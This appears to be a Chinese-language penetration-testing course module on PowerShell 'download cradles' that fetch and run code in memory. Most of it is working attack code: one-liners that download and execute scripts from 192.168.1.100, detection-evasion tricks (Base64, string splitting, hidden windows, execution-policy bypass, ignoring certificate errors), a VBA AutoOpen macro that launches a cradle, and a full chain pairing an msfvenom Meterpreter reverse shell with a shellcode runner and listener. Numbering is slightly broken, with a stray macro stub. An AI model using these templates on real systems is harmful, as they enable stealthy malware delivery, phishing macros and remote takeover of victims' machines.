# Module 05: 反射式 PowerShell

## 第二节：下载摇篮技术 (Download Cradle)

### 什么是下载摇篮？

下载摇篮（Download Cradle）是一种技术，用于从远程服务器下载并执行代码，**无需将文件保存到磁盘**。

```
传统方式:
下载文件 → 保存到磁盘 → 执行
                ↑
           文件落地，易被检测

下载摇篮:
下载代码 → 直接在内存中执行
                ↑
           无文件落地
```

---

## 一、基础下载摇篮

### 1.1 DownloadString - 下载文本

```powershell
# 下载并执行 PowerShell 脚本
$code = (New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1')
Invoke-Expression $code

# 简写形式（一行）
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1')

# 更简短的形式
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1')
```

### 1.2 DownloadData - 下载二进制

```powershell
# 下载二进制数据（如 DLL）
$data = (New-Object Net.WebClient).DownloadData('http://192.168.1.100/payload.dll')

# 反射式加载
$assembly = [System.Reflection.Assembly]::Load($data)
```

### 1.3 DownloadFile - 下载到磁盘

```powershell
# 下载文件到磁盘（有文件落地）
(New-Object Net.WebClient).DownloadFile('http://192.168.1.100/file.exe', 'C:\temp\file.exe')
```

## 二、高级下载摇篮

### 2.1 使用 Invoke-WebRequest

```powershell
# PowerShell 3.0+ 的现代方式
$response = Invoke-WebRequest -Uri 'http://192.168.1.100/script.ps1'
IEX $response.Content

# 简写
IEX (iwr 'http://192.168.1.100/script.ps1').Content
```

### 2.2 使用 Invoke-RestMethod

```powershell
# 适用于 REST API
$code = Invoke-RestMethod -Uri 'http://192.168.1.100/script.ps1'
IEX $code
```

### 2.3 使用 .NET HttpClient

```powershell
# 使用 HttpClient（更现代的方式）
$client = New-Object System.Net.Http.HttpClient
$code = $client.GetStringAsync('http://192.168.1.100/script.ps1').Result
IEX $code
```

## 三、代理感知下载

### 3.1 自动使用系统代理

```powershell
# WebClient 默认使用系统代理
$wc = New-Object Net.WebClient
$wc.Proxy = [Net.WebRequest]::GetSystemWebProxy()
$wc.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
$code = $wc.DownloadString('http://192.168.1.100/script.ps1')
IEX $code
```

### 3.2 指定代理服务器

```powershell
# 手动指定代理
$proxy = New-Object Net.WebProxy('http://proxy.corp.local:8080')
$proxy.Credentials = [Net.CredentialCache]::DefaultCredentials

$wc = New-Object Net.WebClient
$wc.Proxy = $proxy
$code = $wc.DownloadString('http://192.168.1.100/script.ps1')
IEX $code
```

## 四、绕过技术

### 4.1 Base64 编码

```powershell
# 编码（在 Kali 上）
$code = Get-Content script.ps1 -Raw
$bytes = [System.Text.Encoding]::Unicode.GetBytes($code)
$encoded = [Convert]::ToBase64String($bytes)
Write-Output $encoded

# 解码并执行（在目标上）
powershell -enc <base64_string>

# 或者
$decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
IEX $decoded
```

### 4.2 字符串拼接

```powershell
# 拆分敏感字符串
$a = "Down"
$b = "load"
$c = "String"
$method = $a + $b + $c

$wc = New-Object Net.WebClient
$code = $wc.$method('http://192.168.1.100/script.ps1')
IEX $code
```

### 4.3 使用变量替换

```powershell
# 使用变量隐藏 URL
$u = 'http://192.168.1.100/script.ps1'
$w = New-Object Net.WebClient
$c = $w.DownloadString($u)
IEX $c
```

### 4.4 使用 Invoke-Expression 别名

```powershell
# IEX 是 Invoke-Expression 的别名
# 还可以使用其他方式
& ([scriptblock]::Create($code))

# 或者
. ([scriptblock]::Create($code))
```

## 五、常用下载摇篮模板

### 5.1 基础模板

```powershell
# 最简单的下载摇篮
IEX(New-Object Net.WebClient).DownloadString('http://IP/script.ps1')
```

### 5.2 代理感知模板

```powershell
# 企业环境适用
$wc=New-Object Net.WebClient;$wc.Proxy=[Net.WebRequest]::GetSystemWebProxy();$wc.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX($wc.DownloadString('http://IP/script.ps1'))
```

### 5.3 HTTPS 模板

```powershell
# 忽略证书错误
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX(New-Object Net.WebClient).DownloadString('https://IP/script.ps1')
```

### 5.4 隐藏执行模板

```powershell
# 完整的隐藏执行命令
powershell -ep bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/script.ps1')"
```

## 六、与 VBA 宏结合

### 6.1 基础 VBA 下载摇篮

```vba
Sub AutoOpen()

    str = "powershell -ep bypass -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/run.ps1')"""
    CreateObject("WScript.Shell").Run str, 0
End Sub
```

```vba
Sub AutoOpen()
```

## 八、实战示例

### 8.1 完整的攻击流程

```bash
# 1. 在 Kali 上生成 shellcode
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.1.100 LPORT=443 \
    EXITFUNC=thread -f ps1 -o shellcode.txt

# 2. 创建 PowerShell 脚本 (run.ps1)
cat > /var/www/html/run.ps1 << 'EOF'
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@
Add-Type $Kernel32

# 粘贴 shellcode
[Byte[]] $buf = @(0xfc,0x48,0x83)  # 实际使用时替换为完整 shellcode

$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thread = [Kernel32]::CreateThread(0,0,$addr,0,0,0)
[Kernel32]::WaitForSingleObject($thread, [uint32]"0xFFFFFFFF")
EOF

# 3. 启动 Web 服务器
sudo systemctl start apache2

# 4. 启动监听器
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.1.100; set LPORT 443; run"
```

### 8.2 在目标上执行

```powershell
# 方法 1: 直接执行
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/run.ps1')

# 方法 2: 通过 cmd
cmd /c powershell -ep bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/run.ps1')"
```
